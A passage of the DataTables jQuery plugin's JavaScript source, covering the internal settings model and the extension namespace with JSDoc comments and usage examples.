		 *  @name DataTable.defaults.column.type

		 *  @dtopt Columns

		 *

		 *  @example

		 *    // Using `columnDefs`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [

		 *          { "type": "html", "targets": [ 0 ] }

		 *        ]

		 *      } );

		 *    } );

		 *

		 *  @example

		 *    // Using `columns`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columns": [

		 *          { "type": "html" },

		 *          null,

		 *          null,

		 *          null,

		 *          null

		 *        ]

		 *      } );

		 *    } );

		 */

		"sType": null,

	

	

		/**

		 * Defining the width of the column, this parameter may take any CSS value

		 * (3em, 20px etc). DataTables applies 'smart' widths to columns which have not

		 * been given a specific width through this interface ensuring that the table

		 * remains readable.

		 *  @type string

		 *  @default null <i>Automatic</i>

		 *

		 *  @name DataTable.defaults.column.width

		 *  @dtopt Columns

		 *

		 *  @example

		 *    // Using `columnDefs`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [

		 *          { "width": "20%", "targets": [ 0 ] }

		 *        ]

		 *      } );

		 *    } );

		 *

		 *  @example

		 *    // Using `columns`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columns": [

		 *          { "width": "20%" },

		 *          null,

		 *          null,

		 *          null,

		 *          null

		 *        ]

		 *      } );

		 *    } );

		 */

		"sWidth": null

	};

	

	_fnHungarianMap( DataTable.defaults.column );

	

	

	

	/**

	 * DataTables settings object - this holds all the information needed for a

	 * given table, including configuration, data and current application of the

	 * table options. DataTables does not have a single instance for each DataTable

	 * with the settings attached to that instance, but rather instances of the

	 * DataTable "class" are created on-the-fly as needed (typically by a

	 * $().dataTable() call) and the settings object is then applied to that

	 * instance.

	 *

	 * Note that this object is related to {@link DataTable.defaults} but this

	 * one is the internal data store for DataTables's cache of columns. It should

	 * NOT be manipulated outside of DataTables. Any configuration should be done

	 * through the initialisation options.

	 *  @namespace

	 *  @todo Really should attach the settings object to individual instances so we

	 *    don't need to create new instances on each $().dataTable() call (if the

	 *    table already exists). It would also save passing oSettings around and

	 *    into every single function. However, this is a very significant

	 *    architecture change for DataTables and will almost certainly break

	 *    backwards compatibility with older installations. This is something that

	 *    will be done in 2.0.

	 */

	DataTable.models.oSettings = {

		/**

		 * Primary features of DataTables and their enablement state.

		 *  @namespace

		 */

		"oFeatures": {

	

			/**

			 * Flag to say if DataTables should automatically try to calculate the

			 * optimum table and columns widths (true) or not (false).

			 * Note that this parameter will be set by the initialisation routine. To

			 * set a default use {@link DataTable.defaults}.

			 *  @type boolean

			 */

			"bAutoWidth": null,

	

			/**

			 * Delay the creation of TR and TD elements until they are actually

			 * needed by a driven page draw. This can give a significant speed

			 * increase for Ajax source and Javascript source data, but makes no

			 * difference at all fro DOM and server-side processing tables.

			 * Note that this parameter will be set by the initialisation routine. To

			 * set a default use {@link DataTable.defaults}.

			 *  @type boolean

			 */

			"bDeferRender": null,

	

			/**

			 * Enable filtering on the table or not. Note that if this is disabled

			 * then there is no filtering at all on the table, including fnFilter.

			 * To just remove the filtering input use sDom and remove the 'f' option.

			 * Note that this parameter will be set by the initialisation routine. To

			 * set a default use {@link DataTable.defaults}.

			 *  @type boolean

			 */

			"bFilter": null,

	

			/**

			 * Table information element (the 'Showing x of y records' div) enable

			 * flag.

			 * Note that this parameter will be set by the initialisation routine. To

			 * set a default use {@link DataTable.defaults}.

			 *  @type boolean

			 */

			"bInfo": null,

	

			/**

			 * Present a user control allowing the end user to change the page size

			 * when pagination is enabled.

			 * Note that this parameter will be set by the initialisation routine. To

			 * set a default use {@link DataTable.defaults}.

			 *  @type boolean

			 */

			"bLengthChange": null,

	

			/**

			 * Pagination enabled or not. Note that if this is disabled then length

			 * changing must also be disabled.

			 * Note that this parameter will be set by the initialisation routine. To

			 * set a default use {@link DataTable.defaults}.

			 *  @type boolean

			 */

			"bPaginate": null,

	

			/**

			 * Processing indicator enable flag whenever DataTables is enacting a

			 * user request - typically an Ajax request for server-side processing.

			 * Note that this parameter will be set by the initialisation routine. To

			 * set a default use {@link DataTable.defaults}.

			 *  @type boolean

			 */

			"bProcessing": null,

	

			/**

			 * Server-side processing enabled flag - when enabled DataTables will

			 * get all data from the server for every draw - there is no filtering,

			 * sorting or paging done on the client-side.

			 * Note that this parameter will be set by the initialisation routine. To

			 * set a default use {@link DataTable.defaults}.

			 *  @type boolean

			 */

			"bServerSide": null,

	

			/**

			 * Sorting enablement flag.

			 * Note that this parameter will be set by the initialisation routine. To

			 * set a default use {@link DataTable.defaults}.

			 *  @type boolean

			 */

			"bSort": null,

	

			/**

			 * Multi-column sorting

			 * Note that this parameter will be set by the initialisation routine. To

			 * set a default use {@link DataTable.defaults}.

			 *  @type boolean

			 */

			"bSortMulti": null,

	

			/**

			 * Apply a class to the columns which are being sorted to provide a

			 * visual highlight or not. This can slow things down when enabled since

			 * there is a lot of DOM interaction.

			 * Note that this parameter will be set by the initialisation routine. To

			 * set a default use {@link DataTable.defaults}.

			 *  @type boolean

			 */

			"bSortClasses": null,

	

			/**

			 * State saving enablement flag.

			 * Note that this parameter will be set by the initialisation routine. To

			 * set a default use {@link DataTable.defaults}.

			 *  @type boolean

			 */

			"bStateSave": null

		},

	

	

		/**

		 * Scrolling settings for a table.

		 *  @namespace

		 */

		"oScroll": {

			/**

			 * When the table is shorter in height than sScrollY, collapse the

			 * table container down to the height of the table (when true).

			 * Note that this parameter will be set by the initialisation routine. To

			 * set a default use {@link DataTable.defaults}.

			 *  @type boolean

			 */

			"bCollapse": null,

	

			/**

			 * Width of the scrollbar for the web-browser's platform. Calculated

			 * during table initialisation.

			 *  @type int

			 *  @default 0

			 */

			"iBarWidth": 0,

	

			/**

			 * Viewport width for horizontal scrolling. Horizontal scrolling is

			 * disabled if an empty string.

			 * Note that this parameter will be set by the initialisation routine. To

			 * set a default use {@link DataTable.defaults}.

			 *  @type string

			 */

			"sX": null,

	

			/**

			 * Width to expand the table to when using x-scrolling. Typically you

			 * should not need to use this.

			 * Note that this parameter will be set by the initialisation routine. To

			 * set a default use {@link DataTable.defaults}.

			 *  @type string

			 *  @deprecated

			 */

			"sXInner": null,

	

			/**

			 * Viewport height for vertical scrolling. Vertical scrolling is disabled

			 * if an empty string.

			 * Note that this parameter will be set by the initialisation routine. To

			 * set a default use {@link DataTable.defaults}.

			 *  @type string

			 */

			"sY": null

		},

	

		/**

		 * Language information for the table.

		 *  @namespace

		 *  @extends DataTable.defaults.oLanguage

		 */

		"oLanguage": {

			/**

			 * Information callback function. See

			 * {@link DataTable.defaults.fnInfoCallback}

			 *  @type function

			 *  @default null

			 */

			"fnInfoCallback": null

		},

	

		/**

		 * Browser support parameters

		 *  @namespace

		 */

		"oBrowser": {

			/**

			 * Indicate if the browser incorrectly calculates width:100% inside a

			 * scrolling element (IE6/7)

			 *  @type boolean

			 *  @default false

			 */

			"bScrollOversize": false,

	

			/**

			 * Determine if the vertical scrollbar is on the right or left of the

			 * scrolling container - needed for rtl language layout, although not

			 * all browsers move the scrollbar (Safari).

			 *  @type boolean

			 *  @default false

			 */

			"bScrollbarLeft": false,

	

			/**

			 * Flag for if `getBoundingClientRect` is fully supported or not

			 *  @type boolean

			 *  @default false

			 */

			"bBounding": false,

	

			/**

			 * Browser scrollbar width

			 *  @type integer

			 *  @default 0

			 */

			"barWidth": 0

		},

	

	

		"ajax": null,

	

	

		/**

		 * Array referencing the nodes which are used for the features. The

		 * parameters of this object match what is allowed by sDom - i.e.

		 *   <ul>

		 *     <li>'l' - Length changing</li>

		 *     <li>'f' - Filtering input</li>

		 *     <li>'t' - The table!</li>

		 *     <li>'i' - Information</li>

		 *     <li>'p' - Pagination</li>

		 *     <li>'r' - pRocessing</li>

		 *   </ul>

		 *  @type array

		 *  @default []

		 */

		"aanFeatures": [],

	

		/**

		 * Store data information - see {@link DataTable.models.oRow} for detailed

		 * information.

		 *  @type array

		 *  @default []

		 */

		"aoData": [],

	

		/**

		 * Array of indexes which are in the current display (after filtering etc)

		 *  @type array

		 *  @default []

		 */

		"aiDisplay": [],

	

		/**

		 * Array of indexes for display - no filtering

		 *  @type array

		 *  @default []

		 */

		"aiDisplayMaster": [],

	

		/**

		 * Map of row ids to data indexes

		 *  @type object

		 *  @default {}

		 */

		"aIds": {},

	

		/**

		 * Store information about each column that is in use

		 *  @type array

		 *  @default []

		 */

		"aoColumns": [],

	

		/**

		 * Store information about the table's header

		 *  @type array

		 *  @default []

		 */

		"aoHeader": [],

	

		/**

		 * Store information about the table's footer

		 *  @type array

		 *  @default []

		 */

		"aoFooter": [],

	

		/**

		 * Store the applied global search information in case we want to force a

		 * research or compare the old search to a new one.

		 * Note that this parameter will be set by the initialisation routine. To

		 * set a default use {@link DataTable.defaults}.

		 *  @namespace

		 *  @extends DataTable.models.oSearch

		 */

		"oPreviousSearch": {},

	

		/**

		 * Store the applied search for each column - see

		 * {@link DataTable.models.oSearch} for the format that is used for the

		 * filtering information for each column.

		 *  @type array

		 *  @default []

		 */

		"aoPreSearchCols": [],

	

		/**

		 * Sorting that is applied to the table. Note that the inner arrays are

		 * used in the following manner:

		 * <ul>

		 *   <li>Index 0 - column number</li>

		 *   <li>Index 1 - current sorting direction</li>

		 * </ul>

		 * Note that this parameter will be set by the initialisation routine. To

		 * set a default use {@link DataTable.defaults}.

		 *  @type array

		 *  @todo These inner arrays should really be objects

		 */

		"aaSorting": null,

	

		/**

		 * Sorting that is always applied to the table (i.e. prefixed in front of

		 * aaSorting).

		 * Note that this parameter will be set by the initialisation routine. To

		 * set a default use {@link DataTable.defaults}.

		 *  @type array

		 *  @default []

		 */

		"aaSortingFixed": [],

	

		/**

		 * Classes to use for the striping of a table.

		 * Note that this parameter will be set by the initialisation routine. To

		 * set a default use {@link DataTable.defaults}.

		 *  @type array

		 *  @default []

		 */

		"asStripeClasses": null,

	

		/**

		 * If restoring a table - we should restore its striping classes as well

		 *  @type array

		 *  @default []

		 */

		"asDestroyStripes": [],

	

		/**

		 * If restoring a table - we should restore its width

		 *  @type int

		 *  @default 0

		 */

		"sDestroyWidth": 0,

	

		/**

		 * Callback functions array for every time a row is inserted (i.e. on a draw).

		 *  @type array

		 *  @default []

		 */

		"aoRowCallback": [],

	

		/**

		 * Callback functions for the header on each draw.

		 *  @type array

		 *  @default []

		 */

		"aoHeaderCallback": [],

	

		/**

		 * Callback function for the footer on each draw.

		 *  @type array

		 *  @default []

		 */

		"aoFooterCallback": [],

	

		/**

		 * Array of callback functions for draw callback functions

		 *  @type array

		 *  @default []

		 */

		"aoDrawCallback": [],

	

		/**

		 * Array of callback functions for row created function

		 *  @type array

		 *  @default []

		 */

		"aoRowCreatedCallback": [],

	

		/**

		 * Callback functions for just before the table is redrawn. A return of

		 * false will be used to cancel the draw.

		 *  @type array

		 *  @default []

		 */

		"aoPreDrawCallback": [],

	

		/**

		 * Callback functions for when the table has been initialised.

		 *  @type array

		 *  @default []

		 */

		"aoInitComplete": [],

	

	

		/**

		 * Callbacks for modifying the settings to be stored for state saving, prior to

		 * saving state.

		 *  @type array

		 *  @default []

		 */

		"aoStateSaveParams": [],

	

		/**

		 * Callbacks for modifying the settings that have been stored for state saving

		 * prior to using the stored values to restore the state.

		 *  @type array

		 *  @default []

		 */

		"aoStateLoadParams": [],

	

		/**

		 * Callbacks for operating on the settings object once the saved state has been

		 * loaded

		 *  @type array

		 *  @default []

		 */

		"aoStateLoaded": [],

	

		/**

		 * Cache the table ID for quick access

		 *  @type string

		 *  @default <i>Empty string</i>

		 */

		"sTableId": "",

	

		/**

		 * The TABLE node for the main table

		 *  @type node

		 *  @default null

		 */

		"nTable": null,

	

		/**

		 * Permanent ref to the thead element

		 *  @type node

		 *  @default null

		 */

		"nTHead": null,

	

		/**

		 * Permanent ref to the tfoot element - if it exists

		 *  @type node

		 *  @default null

		 */

		"nTFoot": null,

	

		/**

		 * Permanent ref to the tbody element

		 *  @type node

		 *  @default null

		 */

		"nTBody": null,

	

		/**

		 * Cache the wrapper node (contains all DataTables controlled elements)

		 *  @type node

		 *  @default null

		 */

		"nTableWrapper": null,

	

		/**

		 * Indicate if when using server-side processing the loading of data

		 * should be deferred until the second draw.

		 * Note that this parameter will be set by the initialisation routine. To

		 * set a default use {@link DataTable.defaults}.

		 *  @type boolean

		 *  @default false

		 */

		"bDeferLoading": false,

	

		/**

		 * Indicate if all required information has been read in

		 *  @type boolean

		 *  @default false

		 */

		"bInitialised": false,

	

		/**

		 * Information about open rows. Each object in the array has the parameters

		 * 'nTr' and 'nParent'

		 *  @type array

		 *  @default []

		 */

		"aoOpenRows": [],

	

		/**

		 * Dictate the positioning of DataTables' control elements - see

		 * {@link DataTable.model.oInit.sDom}.

		 * Note that this parameter will be set by the initialisation routine. To

		 * set a default use {@link DataTable.defaults}.

		 *  @type string

		 *  @default null

		 */

		"sDom": null,

	

		/**

		 * Search delay (in mS)

		 *  @type integer

		 *  @default null

		 */

		"searchDelay": null,

	

		/**

		 * Which type of pagination should be used.

		 * Note that this parameter will be set by the initialisation routine. To

		 * set a default use {@link DataTable.defaults}.

		 *  @type string

		 *  @default two_button

		 */

		"sPaginationType": "two_button",

	

		/**

		 * The state duration (for `stateSave`) in seconds.

		 * Note that this parameter will be set by the initialisation routine. To

		 * set a default use {@link DataTable.defaults}.

		 *  @type int

		 *  @default 0

		 */

		"iStateDuration": 0,

	

		/**

		 * Array of callback functions for state saving. Each array element is an

		 * object with the following parameters:

		 *   <ul>

		 *     <li>function:fn - function to call. Takes two parameters, oSettings

		 *       and the JSON string to save that has been thus far created. Returns

		 *       a JSON string to be inserted into a json object

		 *       (i.e. '"param": [ 0, 1, 2]')</li>

		 *     <li>string:sName - name of callback</li>

		 *   </ul>

		 *  @type array

		 *  @default []

		 */

		"aoStateSave": [],

	

		/**

		 * Array of callback functions for state loading. Each array element is an

		 * object with the following parameters:

		 *   <ul>

		 *     <li>function:fn - function to call. Takes two parameters, oSettings

		 *       and the object stored. May return false to cancel state loading</li>

		 *     <li>string:sName - name of callback</li>

		 *   </ul>

		 *  @type array

		 *  @default []

		 */

		"aoStateLoad": [],

	

		/**

		 * State that was saved. Useful for back reference

		 *  @type object

		 *  @default null

		 */

		"oSavedState": null,

	

		/**

		 * State that was loaded. Useful for back reference

		 *  @type object

		 *  @default null

		 */

		"oLoadedState": null,

	

		/**

		 * Source url for AJAX data for the table.

		 * Note that this parameter will be set by the initialisation routine. To

		 * set a default use {@link DataTable.defaults}.

		 *  @type string

		 *  @default null

		 */

		"sAjaxSource": null,

	

		/**

		 * Property from a given object from which to read the table data from. This

		 * can be an empty string (when not server-side processing), in which case

		 * it is  assumed an an array is given directly.

		 * Note that this parameter will be set by the initialisation routine. To

		 * set a default use {@link DataTable.defaults}.

		 *  @type string

		 */

		"sAjaxDataProp": null,

	

		/**

		 * Note if draw should be blocked while getting data

		 *  @type boolean

		 *  @default true

		 */

		"bAjaxDataGet": true,

	

		/**

		 * The last jQuery XHR object that was used for server-side data gathering.

		 * This can be used for working with the XHR information in one of the

		 * callbacks

		 *  @type object

		 *  @default null

		 */

		"jqXHR": null,

	

		/**

		 * JSON returned from the server in the last Ajax request

		 *  @type object

		 *  @default undefined

		 */

		"json": undefined,

	

		/**

		 * Data submitted as part of the last Ajax request

		 *  @type object

		 *  @default undefined

		 */

		"oAjaxData": undefined,

	

		/**

		 * Function to get the server-side data.

		 * Note that this parameter will be set by the initialisation routine. To

		 * set a default use {@link DataTable.defaults}.

		 *  @type function

		 */

		"fnServerData": null,

	

		/**

		 * Functions which are called prior to sending an Ajax request so extra

		 * parameters can easily be sent to the server

		 *  @type array

		 *  @default []

		 */

		"aoServerParams": [],

	

		/**

		 * Send the XHR HTTP method - GET or POST (could be PUT or DELETE if

		 * required).

		 * Note that this parameter will be set by the initialisation routine. To

		 * set a default use {@link DataTable.defaults}.

		 *  @type string

		 */

		"sServerMethod": null,

	

		/**

		 * Format numbers for display.

		 * Note that this parameter will be set by the initialisation routine. To

		 * set a default use {@link DataTable.defaults}.

		 *  @type function

		 */

		"fnFormatNumber": null,

	

		/**

		 * List of options that can be used for the user selectable length menu.

		 * Note that this parameter will be set by the initialisation routine. To

		 * set a default use {@link DataTable.defaults}.

		 *  @type array

		 *  @default []

		 */

		"aLengthMenu": null,

	

		/**

		 * Counter for the draws that the table does. Also used as a tracker for

		 * server-side processing

		 *  @type int

		 *  @default 0

		 */

		"iDraw": 0,

	

		/**

		 * Indicate if a redraw is being done - useful for Ajax

		 *  @type boolean

		 *  @default false

		 */

		"bDrawing": false,

	

		/**

		 * Draw index (iDraw) of the last error when parsing the returned data

		 *  @type int

		 *  @default -1

		 */

		"iDrawError": -1,

	

		/**

		 * Paging display length

		 *  @type int

		 *  @default 10

		 */

		"_iDisplayLength": 10,

	

		/**

		 * Paging start point - aiDisplay index

		 *  @type int

		 *  @default 0

		 */

		"_iDisplayStart": 0,

	

		/**

		 * Server-side processing - number of records in the result set

		 * (i.e. before filtering), Use fnRecordsTotal rather than

		 * this property to get the value of the number of records, regardless of

		 * the server-side processing setting.

		 *  @type int

		 *  @default 0

		 *  @private

		 */

		"_iRecordsTotal": 0,

	

		/**

		 * Server-side processing - number of records in the current display set

		 * (i.e. after filtering). Use fnRecordsDisplay rather than

		 * this property to get the value of the number of records, regardless of

		 * the server-side processing setting.

		 *  @type boolean

		 *  @default 0

		 *  @private

		 */

		"_iRecordsDisplay": 0,

	

		/**

		 * The classes to use for the table

		 *  @type object

		 *  @default {}

		 */

		"oClasses": {},

	

		/**

		 * Flag attached to the settings object so you can check in the draw

		 * callback if filtering has been done in the draw. Deprecated in favour of

		 * events.

		 *  @type boolean

		 *  @default false

		 *  @deprecated

		 */

		"bFiltered": false,

	

		/**

		 * Flag attached to the settings object so you can check in the draw

		 * callback if sorting has been done in the draw. Deprecated in favour of

		 * events.

		 *  @type boolean

		 *  @default false

		 *  @deprecated

		 */

		"bSorted": false,

	

		/**

		 * Indicate that if multiple rows are in the header and there is more than

		 * one unique cell per column, if the top one (true) or bottom one (false)

		 * should be used for sorting / title by DataTables.

		 * Note that this parameter will be set by the initialisation routine. To

		 * set a default use {@link DataTable.defaults}.

		 *  @type boolean

		 */

		"bSortCellsTop": null,

	

		/**

		 * Initialisation object that is used for the table

		 *  @type object

		 *  @default null

		 */

		"oInit": null,

	

		/**

		 * Destroy callback functions - for plug-ins to attach themselves to the

		 * destroy so they can clean up markup and events.

		 *  @type array

		 *  @default []

		 */

		"aoDestroyCallback": [],

	

	

		/**

		 * Get the number of records in the current record set, before filtering

		 *  @type function

		 */

		"fnRecordsTotal": function ()

		{

			return _fnDataSource( this ) == 'ssp' ?

				this._iRecordsTotal * 1 :

				this.aiDisplayMaster.length;

		},

	

		/**

		 * Get the number of records in the current record set, after filtering

		 *  @type function

		 */

		"fnRecordsDisplay": function ()

		{

			return _fnDataSource( this ) == 'ssp' ?

				this._iRecordsDisplay * 1 :

				this.aiDisplay.length;

		},

	

		/**

		 * Get the display end point - aiDisplay index

		 *  @type function

		 */

		"fnDisplayEnd": function ()

		{

			var

				len      = this._iDisplayLength,

				start    = this._iDisplayStart,

				calc     = start + len,

				records  = this.aiDisplay.length,

				features = this.oFeatures,

				paginate = features.bPaginate;

	

			if ( features.bServerSide ) {

				return paginate === false || len === -1 ?

					start + records :

					Math.min( start+len, this._iRecordsDisplay );

			}

			else {

				return ! paginate || calc>records || len===-1 ?

					records :

					calc;

			}

		},

	

		/**

		 * The DataTables object for this table

		 *  @type object

		 *  @default null

		 */

		"oInstance": null,

	

		/**

		 * Unique identifier for each instance of the DataTables object. If there

		 * is an ID on the table node, then it takes that value, otherwise an

		 * incrementing internal counter is used.

		 *  @type string

		 *  @default null

		 */

		"sInstance": null,

	

		/**

		 * tabindex attribute value that is added to DataTables control elements, allowing

		 * keyboard navigation of the table and its controls.

		 */

		"iTabIndex": 0,

	

		/**

		 * DIV container for the footer scrolling table if scrolling

		 */

		"nScrollHead": null,

	

		/**

		 * DIV container for the footer scrolling table if scrolling

		 */

		"nScrollFoot": null,

	

		/**

		 * Last applied sort

		 *  @type array

		 *  @default []

		 */

		"aLastSort": [],

	

		/**

		 * Stored plug-in instances

		 *  @type object

		 *  @default {}

		 */

		"oPlugins": {},

	

		/**

		 * Function used to get a row's id from the row's data

		 *  @type function

		 *  @default null

		 */

		"rowIdFn": null,

	

		/**

		 * Data location where to store a row's id

		 *  @type string

		 *  @default null

		 */

		"rowId": null

	};



	/**

	 * Extension object for DataTables that is used to provide all extension

	 * options.

	 *

	 * Note that the `DataTable.ext` object is available through

	 * `jQuery.fn.dataTable.ext` where it may be accessed and manipulated. It is

	 * also aliased to `jQuery.fn.dataTableExt` for historic reasons.

	 *  @namespace

	 *  @extends DataTable.models.ext

	 */

	

	

	/**

	 * DataTables extensions

	 * 

	 * This namespace acts as a collection area for plug-ins that can be used to

	 * extend DataTables capabilities. Indeed many of the build in methods

	 * use this method to provide their own capabilities (sorting methods for

	 * example).

	 *

	 * Note that this namespace is aliased to `jQuery.fn.dataTableExt` for legacy

	 * reasons

	 *

	 *  @namespace

	 */

	DataTable.ext = _ext = {

		/**

		 * Buttons. For use with the Buttons extension for DataTables. This is

		 * defined here so other extensions can define buttons regardless of load

		 * order. It is _not_ used by DataTables core.

		 *

		 *  @type object

		 *  @default {}

		 */

		buttons: {},

	

	

		/**

		 * Element class names

		 *

		 *  @type object

		 *  @default {}

		 */

		classes: {},

	

	

		/**

		 * DataTables build type (expanded by the download builder)

		 *

		 *  @type string

		 */

		build:"dt/dt-1.10.21",

	

	

		/**

		 * Error reporting.

		 * 

		 * How should DataTables report an error. Can take the value 'alert',

		 * 'throw', 'none' or a function.

		 *

		 *  @type string|function

		 *  @default alert

		 */

		errMode: "alert",

	

	

		/**

		 * Feature plug-ins.

		 * 

		 * This is an array of objects which describe the feature plug-ins that are

		 * available to DataTables. These feature plug-ins are then available for

		 * use through the `dom` initialisation option.

		 * 

		 * Each feature plug-in is described by an object which must have the

		 * following properties:

		 * 

		 * * `fnInit` - function that is used to initialise the plug-in,

		 * * `cFeature` - a character so the feature can be enabled by the `dom`

		 *   instillation option. This is case sensitive.

		 *

		 * The `fnInit` function has the following input parameters:

		 *

		 * 1. `{object}` DataTables settings object: see

		 *    {@link DataTable.models.oSettings}

		 *

		 * And the following return is expected:

		 * 

		 * * {node|null} The element which contains your feature. Note that the

		 *   return may also be void if your plug-in does not require to inject any

		 *   DOM elements into DataTables control (`dom`) - for example this might

		 *   be useful when developing a plug-in which allows table control via

		 *   keyboard entry

		 *

		 *  @type array

		 *

		 *  @example

		 *    $.fn.dataTable.ext.features.push( {

		 *      "fnInit": function( oSettings ) {

		 *        return new TableTools( { "oDTSettings": oSettings } );

		 *      },

		 *      "cFeature": "T"

		 *    } );

		 */

		feature: [],

	

	

		/**

		 * Row searching.

		 * 

		 * This method of searching is complimentary to the default type based

		 * searching, and a lot more comprehensive as it allows you complete control

		 * over the searching logic. Each element in this array is a function

		 * (parameters described below) that is called for every row in the table,

		 * and your logic decides if it should be included in the searching data set

		 * or not.

		 *

		 * Searching functions have the following input parameters:

		 *

		 * 1. `{object}` DataTables settings object: see

		 *    {@link DataTable.models.oSettings}

		 * 2. `{array|object}` Data for the row to be processed (same as the

		 *    original format that was passed in as the data source, or an array

		 *    from a DOM data source

		 * 3. `{int}` Row index ({@link DataTable.models.oSettings.aoData}), which

		 *    can be useful to retrieve the `TR` element if you need DOM interaction.

		 *

		 * And the following return is expected:

		 *

		 * * {boolean} Include the row in the searched result set (true) or not

		 *   (false)

		 *

		 * Note that as with the main search ability in DataTables, technically this

		 * is "filtering", since it is subtractive. However, for consistency in

		 * naming we call it searching here.

		 *

		 *  @type array

		 *  @default []

		 *

		 *  @example

		 *    // The following example shows custom search being applied to the

		 *    // fourth column (i.e. the data[3] index) based on two input values

		 *    // from the end-user, matching the data in a certain range.

		 *    $.fn.dataTable.ext.search.push(

		 *      function( settings, data, dataIndex ) {

		 *        var min = document.getElementById('min').value * 1;

		 *        var max = document.getElementById('max').value * 1;

		 *        var version = data[3] == "-" ? 0 : data[3]*1;

		 *

		 *        if ( min == "" && max == "" ) {

		 *          return true;

		 *        }

		 *        else if ( min == "" && version < max ) {

		 *          return true;

		 *        }

		 *        else if ( min < version && "" == max ) {

		 *          return true;

		 *        }

		 *        else if ( min < version && version < max ) {

		 *          return true;

		 *        }

		 *        return false;

		 *      }

		 *    );

		 */

		search: [],

	

	

		/**

		 * Selector extensions

		 *

		 * The `selector` option can be used to extend the options available for the

		 * selector modifier options (`selector-modifier` object data type) that

		 * each of the three built in selector types offer (row, column and cell +

		 * their plural counterparts). For example the Select extension uses this

		 * mechanism to provide an option to select only rows, columns and cells

		 * that have been marked as selected by the end user (`{selected: true}`),

		 * which can be used in conjunction with the existing built in selector

		 * options.

		 *

		 * Each property is an array to which functions can be pushed. The functions

		 * take three attributes:

		 *

		 * * Settings object for the host table

		 * * Options object (`selector-modifier` object type)

		 * * Array of selected item indexes

		 *

		 * The return is an array of the resulting item indexes after the custom

		 * selector has been applied.

		 *

		 *  @type object

		 */

		selector: {

			cell: [],

			column: [],

			row: []

		},

	

	

		/**

		 * Internal functions, exposed for used in plug-ins.

		 * 

		 * Please note that you should not need to use the internal methods for

		 * anything other than a plug-in (and even then, try to avoid if possible).

		 * The internal function may change between releases.

		 *

		 *  @type object

		 *  @default {}

		 */

		internal: {},

	

	

		/**

		 * Legacy configuration options. Enable and disable legacy options that

		 * are available in DataTables.

		 *

		 *  @type object

		 */

		legacy: {

			/**

			 * Enable / disable DataTables 1.9 compatible server-side processing

			 * requests

			 *

			 *  @type boolean

			 *  @default null

			 */

			ajax: null

		},

	

	

		/**

		 * Pagination plug-in methods.

		 * 

		 * Each entry in this object is a function and defines which buttons should

		 * be shown by the pagination rendering method that is used for the table:

		 * {@link DataTable.ext.renderer.pageButton}. The renderer addresses how the

		 * buttons are displayed in the document, while the functions here tell it

		 * what buttons to display. This is done by returning an array of button

		 * descriptions (what each button will do).

		 *

		 * Pagination types (the four built in options and any additional plug-in

		 * options defined here) can be used through the `paginationType`

		 * initialisation parameter.

		 *

		 * The functions defined take two parameters:

		 *

		 * 1. `{int} page` The current page index

		 * 2. `{int} pages` The number of pages in the table

		 *

		 * Each function is expected to return an array where each element of the

		 * array can be one of:

		 *

		 * * `first` - Jump to first page when activated

		 * * `last` - Jump to last page when activated

		 * * `previous` - Show previous page when activated

		 * * `next` - Show next page when activated

		 * * `{int}` - Show page of the index given

		 * * `{array}` - A nested array containing the above elements to add a

		 *   containing 'DIV' element (might be useful for styling).

		 *

		 * Note that DataTables v1.9- used this object slightly differently whereby

		 * an object with two functions would be defined for each plug-in. That

		 * ability is still supported by DataTables 1.10+ to provide backwards

		 * compatibility, but this option of use is now decremented and no longer

		 * documented in DataTables 1.10+.

		 *

		 *  @type object

		 *  @default {}

		 *

		 *  @example

		 *    // Show previous, next and current page buttons only

		 *    $.fn.dataTableExt.oPagination.current = function ( page, pages ) {

		 *      return [ 'previous', page, 'next' ];

		 *    };

		 */

		pager: {},

	

	

		renderer: {

			pageButton: {},

			header: {}

		},

	

	

		/**

		 * Ordering plug-ins - custom data source

		 * 

		 * The extension options for ordering of data available here is complimentary

		 * to the default type based ordering that DataTables typically uses. It

		 * allows much greater control over the the data that is being used to

		 * order a column, but is necessarily therefore more complex.

		 * 

		 * This type of ordering is useful if you want to do ordering based on data

		 * live from the DOM (for example the contents of an 'input' element) rather

		 * than just the static string that DataTables knows of.

		 * 

		 * The way these plug-ins work is that you create an array of the values you

		 * wish to be ordering for the column in question and then return that

		 * array. The data in the array much be in the index order of the rows in

		 * the table (not the currently ordering order!). Which order data gathering

		 * function is run here depends on the `dt-init columns.orderDataType`

		 * parameter that is used for the column (if any).

		 *

		 * The functions defined take two parameters:

		 *

		 * 1. `{object}` DataTables settings object: see

		 *    {@link DataTable.models.oSettings}

		 * 2. `{int}` Target column index

		 *

		 * Each function is expected to return an array:

		 *

		 * * `{array}` Data for the column to be ordering upon

		 *

		 *  @type array

		 *

		 *  @example

		 *    // Ordering using `input` node values

		 *    $.fn.dataTable.ext.order['dom-text'] = function  ( settings, col )

		 *    {

		 *      return this.api().column( col, {order:'index'} ).nodes().map( function ( td, i ) {

		 *        return $('input', td).val();

		 *      } );

		 *    }

		 */

		order: {},

	

	

		/**

		 * Type based plug-ins.

		 *

		 * Each column in DataTables has a type assigned to it, either by automatic

		 * detection or by direct assignment using the `type` option for the column.

		 * The type of a column will effect how it is ordering and search (plug-ins

		 * can also make use of the column type if required).

		 *

		 * @namespace

		 */

		type: {

			/**

			 * Type detection functions.

			 *

			 * The functions defined in this object are used to automatically detect

			 * a column's type, making initialisation of DataTables super easy, even

			 * when complex data is in the table.

			 *

			 * The functions defined take two parameters:

			 *

		     *  1. `{*}` Data from the column cell to be analysed

		     *  2. `{settings}` DataTables settings object. This can be used to

		     *     perform context specific type detection - for example detection

		     *     based on language settings such as using a comma for a decimal

		     *     place. Generally speaking the options from the settings will not

		     *     be required

			 *

			 * Each function is expected to return:

			 *

			 * * `{string|null}` Data type detected, or null if unknown (and thus

			 *   pass it on to the other type detection functions.

			 *

			 *  @type array

			 *

			 *  @example

			 *    // Currency type detection plug-in:

			 *    $.fn.dataTable.ext.type.detect.push(

			 *      function ( data, settings ) {

			 *        // Check the numeric part

			 *        if ( ! data.substring(1).match(/[0-9]/) ) {

			 *          return null;

			 *        }

			 *

			 *        // Check prefixed by currency

			 *        if ( data.charAt(0) == '$' || data.charAt(0) == '&pound;' ) {

			 *          return 'currency';

			 *        }

			 *        return null;

			 *      }

			 *    );

			 */

			detect: [],

	

	

			/**

			 * Type based search formatting.

			 *

			 * The type based searching functions can be used to pre-format the

